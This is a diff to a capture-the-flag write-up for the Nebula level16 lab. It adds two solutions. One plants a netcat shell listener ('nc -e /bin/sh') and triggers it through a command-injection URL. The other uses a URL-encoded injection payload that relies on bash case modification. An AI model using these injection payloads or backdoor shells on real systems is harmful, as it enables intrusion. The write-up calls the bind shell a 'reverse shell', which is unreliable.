@@ -133,6 +133,56 @@ Then run http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&pass
 level16@nebula:/tmp$ more /tmp/showflag
 You have successfully executed getflag on a target account
 
+
+
 Sol B - To get flag16 shell by using Revershell
-http://www.pwntester.com/blog/2013/11/26/nebula-level16-write-up/
+-This solution is very similar with Sol A. The only differece is that this solution implants Reverse Shell(backdoor) inside of GETSH
+script.
+
+// /tmp/GETSH
+#!/bin/sh
+
+nc.traditional -lvnp 4444 -e /bin/sh
+# -l: Listen mode
+# -v: Verbose output
+# -n: No DNS lookup
+# -p port: Local port number
+# -e filename: Excute filename after connection is established
+# -c string: Specify shell command to exec afer connect
+
+Then run http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password= with browser.
+
+level16@nebula:~$ netstat -an | grep 4444
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN
+
+level16@nebula:/tmp$ nc localhost 4444
+id
+uid=983(flag16) gid=983(flag16) groups=983(flag16)
+getflag
+You have successfully executed getflag on a target account
+** Once the connection is established, nc closes the listening port 444. However, connected session can continuously use the execed
+reverse shell with the privilege of flag16 **
+
+
+Sol C - Use Bash tricks to mitigate uppercase issue (https://wiki.bash-hackers.org/syntax/pe#case_modification)
+
+- Use /tmp/getsh like below.
+
+// /tmp/getsh
+#!/bin/sh
+/bin/getflag > /tmp/showflag
+
+- Use encoded string like below
+"</dev/null;pwnvar=/tmp/getsh;${pwnvar,,};#  ==> %22%3C%2Fdev%2Fnull%3Bpwnvar%3D%2Ftmp%2Fgetsh%3B%24%7Bpwnvar%2C%2C%7D%3B%23
+  ""</dev/null" - Provide null input(") and /dev/null search file to egrep
+  "pwnvar=/tmp/getsh" - Store /tmp/getsh to a pwnvar variable
+  "${pwnvar,,}" - Bash case modification operation, ",,", will change /TMP/GETSH to /tmp/getsh
+
+
+Then run http://192.168.10.134:1616/index.cgi?username=%22%3C%2Fdev%2Fnull%3Bpwnvar%3D%2Ftmp%2Fgetsh%3B%24%7Bpwnvar%2C%2C%7D%3B%23&password= 
+with browser.
+
+level16@nebula:/tmp$ more showflag
+You have successfully executed getflag on a target account
+
 
